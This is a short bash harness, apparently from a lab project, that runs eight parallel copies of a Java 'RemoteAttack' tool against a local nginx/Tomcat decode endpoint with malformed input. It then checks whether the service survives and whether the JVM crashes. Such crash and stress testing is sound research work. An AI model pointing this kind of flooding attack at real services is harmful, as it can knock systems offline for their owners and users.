#!/usr/bin/env bash
# parallel.sh - concurrency variant: 8 concurrent clients through nginx (more allocation churn).
set -u
BASE=/srv/tc
cd "$HOME/java4shell" || exit 1

alive() { curl -s -m 3 "http://127.0.0.1/dec/decode?b=aGVsbG8=" >/dev/null && echo up || echo DOWN; }
echo "before: $(alive)"

for round in 1 2 3; do
  echo "round $round: 8 x 25000 badtail"
  for i in $(seq 1 8); do
    java src/RemoteAttack.java --target http://127.0.0.1/dec/decode --param b \
      --attempts 25000 --shape badtail >/tmp/pa_$i.log 2>&1 &
  done
  wait
  ok=$(grep -h -E '^  badtail' /tmp/pa_*.log | tr '\n' ' ')
  echo "  $ok"
  echo "  after round: $(alive)"
  rm -f /tmp/pa_*.log
done

echo "hs_err: $(ls -1 $BASE/hs_err_pid*.log 2>/dev/null | tail -3 | tr '\n' ' ')"
echo "threads: $(pgrep -af 'catalina.base=/srv/tc' | wc -l) tomcat proc(s)"
tail -3 "$BASE/logs/stdout.log"
